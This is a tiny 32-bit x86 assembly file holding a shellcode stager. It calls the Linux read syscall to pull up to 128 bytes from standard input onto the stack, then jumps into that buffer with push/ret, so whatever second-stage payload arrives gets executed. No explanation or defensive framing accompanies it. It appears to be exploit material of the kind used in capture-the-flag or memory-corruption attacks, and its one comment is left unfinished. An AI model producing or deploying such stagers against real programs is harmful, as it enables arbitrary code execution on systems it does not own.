BITS 32

start:
    ;; read(0, buff, 
    sub esp, 0x80
    xor eax, eax
    xor ebx, ebx
    mov al, 0x3
    mov ecx, esp
    add dl, 0x80
    ;; mov dl, 0xff
    int 0x80
    push ecx
    ret

